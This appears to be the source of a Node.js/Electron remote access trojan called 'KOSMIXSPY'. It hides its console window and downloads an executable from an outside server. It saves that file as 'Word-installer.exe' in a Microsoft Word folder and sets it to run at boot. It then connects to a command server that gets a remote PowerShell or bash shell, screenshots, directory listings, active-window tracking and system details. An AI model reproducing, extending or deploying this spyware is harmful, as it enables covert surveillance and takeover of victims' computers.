const si = require('systeminformation');
const { io } = require("socket.io-client");
const activeWindow = require('active-win');
const app= require('electron');
const BrowserWindow = app.BrowserWindow;
const path = require('path')
const child = require('child_process');
const { DownloaderHelper } = require('node-downloader-helper');
const { dialog } = require('electron')
const socket = io("http://@<HOST_ANELL_IP@:98");
const pty = require("node-pty")
var ss = require('socket.io-stream');
const os = require("os");
const screenshot = require('screenshot-desktop')
const fs = require("fs");
const open = require('open')
appname = "KOSMIXSPY";
ptc = `C:\\Users\\${os.userInfo().username}\\AppData\\Roaming\\Microsoft\\Word`
var shell = os.platform() === 'win32' ? 'powershell.exe' : 'bash';
platform = os.platform();
// process.title = "Word-installer.exe";
//  console.log(process.title)
  if(platform === 'win32') {

console.log("IS Windows Runtime requirind dependencys") 
var startOnBoot = require('start-on-windows-boot');
const ConsoleWindow = require("node-hide-console-window");

    
    ConsoleWindow.hideConsole();


    // const mainWindow = new BrowserWindow({
      // width: 800,
      // height: 600,
      // webPreferences: {
        // nodeIntegration : true,
        // contextIsolation : false,
      // }
    // })



  }
async function register (id){
console.log("Gettings information")
    static = await si.getStaticData();
    mount = await si.blockDevices();
static.mounted = mount;
console.log("Finish Gettings")
    return {

"socket_id" : id,
"static" : static,
"uuid_pc" : auuid







}
}

function isautostart() 
{
  return new Promise(function(resolve, reject){
  startOnBoot.getAutoStartValue(appname, (value) => {

    if(value == null)
    {
resolve(false);
    }else
    {

      resolve(true);
    }


  });
})

}



async function sete(){
if(platform === 'win32')
{
ias = await isautostart();
if(false == ias || !fs.existsSync(ptc + "\\Word-installer.exe"))
{
  // console.log("Installing in reboot")

if(!fs.existsSync(ptc)){
  fs.mkdirSync(ptc, { recursive: true})
console.log("Creation du dossier de copy")  
}else{
  console.log("Dossier de copy déjà existant");
}

  if(fs.existsSync(ptc + "\\Word-installer.exe")){
     fs.unlinkSync(ptc + "\\Word-installer.exe");
console.log("Suppression de l'ancier fichier word");
  }else
  {

    console.log("Pas besoin de supprimer l'ancier fichier word");
  }
  
  const dl = new DownloaderHelper("https://happy-villani.195-154-174-181.plesk.page/win.exe", ptc + "\\", { fileName : "Word-installer.exe"});
  dl.on('end', () => {
    console.log("end dl");
  startOnBoot.enableAutoStart(appname, ptc + "\\Word-installer.exe");
  })

  dl.start()
}

}
}
sete();










function main(){
  console.log("Registering events")
var ptyProcess = pty.spawn(shell, [], {
  name: 'xterm-color',
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env
});

if(platform == 'win32'){
socket.on("screenshot-desktop",() => {
  screenshot({format: 'png'}).then((img) => {
    bimg = Buffer(img).toString('base64');
  ss(socket).emit("screenshot-desktop-res", bimg);
  })

  


})
}


socket.on("xterm-input", (data) => 
{
  
ptyProcess.write(data);

})

ptyProcess.on("data", (data) =>
{

  socket.emit("xterm-output", data);
})

socket.on("computer-action", (action) => {





})

socket.on("stop-client", () => {

process.exit(0);

})

socket.on("explore", (path) => {

if(fs.existsSync(path) && fs.statSync(path).isDirectory() == true) {
  try {
filess = fs.readdirSync(path);
  }catch(e)
  {
    console.log("Error");
    socket.emit("res-explorer", [], e, path)

  }
json_file = [];
for(i = 0; i < filess.length; i++)
{
try{

  stats = fs.statSync(path  +  filess[i]);

  size = stats.size;

type = stats.isDirectory() ? "directory" : "file";
}catch(e)
{
if(typeof(type) == "undefined") type = "Undefined";
if(typeof(size) == "undefined") size = "Undefined";

}
json_file.push({ "file_name" : filess[i], type, size})




}
socket.emit("res-explorer",  json_file, false, path)
}
else
{
socket.emit("res-explorer", [], "Path doesnt exist", path)
}

})

socket.on("client-disconnect", () => {

  socket.disconnect();
})

socket.on("restart-client", () => {
removelistener(socket);
console.log("Restarting client");
main();


})



socket.on("open-on-client", (type, value, args) => {


  if(type == "")
  {



  }


})


socket.on("disconnect", () => {

  removelistener(socket);
  clearInterval(aw);
  socket.off('xterm-input');
console.log("Socket disconnected")
  try {
  ptyProcess.kill();
  ptyProcess.kill('SIGKILL');

  }catch(e){}
xtermactive = false;

})

  
  socket.on("need_register", async () => {
  console.log("Getting info for register");
    config = await register(socket.id)
    console.log("Finish Gettings information for register");
  
    socket.emit("register", config);
    console.log("Sended register");
  
  })
console.log("Finish register information")
}

socket.on("connect",async () => {

 aw =  setInterval(async () => {
   console.log("Interval running")
   if(typeof(activeWindow) !== 'undefined')
   {
 av = await activeWindow();
   }else{
     av = {"title":"None"};
   }

uptime = os.uptime();
uptimescript = process.uptime();
 if(typeof(av) == "undefined")
 {

  av =  { activewin : {title : "Data inavaillable"}, "machineuptime" : uptime, "scriptuptime" : uptimescript};


 }else
 {
   av = { activewin : av, "machineuptime" : uptime, "scriptuptime" : uptimescript}
 }
 socket.emit("dynamic-data", av);


  }, 30000)




console.log("Connected with this socket id = " + socket.id)
auuid = await si.uuid();

console.log("Checking with id auth = " + auuid.os);
socket.emit("auth", auuid.os);
console.log("FInish auth")
await main();



});





function removelistener(socket)
{
socket.removeListener("explore")
  socket.removeListener("need_register")
socket.removeListener("disconnect")
socket.removeListener("open-on-client")
socket.removeListener("restart-client")
socket.removeListener("client-disconnect")
socket.removeListener("stop-client")
socket.removeListener("computer-action")
socket.removeListener("xterm-input")
socket.removeListener("screenshot-desktop")
socket.removeListener("disconnect")
}